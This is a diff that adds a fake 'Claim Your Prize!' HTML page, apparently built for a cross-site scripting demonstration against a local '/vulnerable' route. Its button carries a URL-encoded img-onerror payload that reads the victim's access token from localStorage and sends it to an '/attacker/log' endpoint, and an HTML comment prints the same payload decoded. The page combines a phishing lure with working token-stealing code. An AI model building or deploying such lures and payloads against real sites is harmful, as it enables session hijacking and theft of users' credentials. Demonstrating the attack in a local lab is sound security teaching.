@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Prize!</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f0f0f0;
+        }
+
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #d9534f;
+        }
+
+        a {
+            display: inline-block;
+            background: #0275d8;
+            color: white;
+            padding: 15px 25px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 1.2em;
+            margin-top: 20px;
+        }
+
+        a:hover {
+            background: #025aa5;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <p>You have been selected to win a special prize.</p>
+        <p>Click the button below to claim it now!</p>
+
+        <!-- 
+        <img src=x onerror="var t=localStorage.getItem('access_token'); alert('YOUR TOKEN HAS BEEN STOLEN: '+t); new Image().src='http://localhost:3000/attacker/log?token='+t">
+        -->
+
+        <a
+            href="http://localhost:5173/vulnerable?q=%3Cimg%20src%3Dx%20onerror%3D%22var%20t%3DlocalStorage.getItem('access_token')%3B%20alert('YOUR%20TOKEN%20HAS%20BEEN%20STOLEN%3A%20'%2Bt)%3B%20new%20Image().src%3D'http%3A%2F%2Flocalhost%3A3000%2Fattacker%2Flog%3Ftoken%3D'%2Bt%22%3E">
+            CLAIM PRIZE NOW
+        </a>
+    </div>
+</body>
+
+</html>
